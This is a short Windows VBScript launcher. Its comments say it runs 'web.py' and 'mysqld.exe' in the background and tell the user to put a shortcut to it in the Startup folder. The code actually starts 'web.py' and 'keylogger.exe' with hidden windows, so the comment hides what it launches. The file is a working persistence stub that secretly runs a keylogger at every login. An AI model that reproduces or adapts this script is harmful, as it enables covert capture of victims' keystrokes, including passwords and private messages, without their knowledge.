'This script is for running web.py aand mysqld.exe ad background
'Create shortcut of this file at startup folder of windows to start it at startup at background 
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "web.py" & Chr(34), 0
WshShell.Run chr(34) & "keylogger.exe" & Chr(34), 0
Set WshShell = Nothing
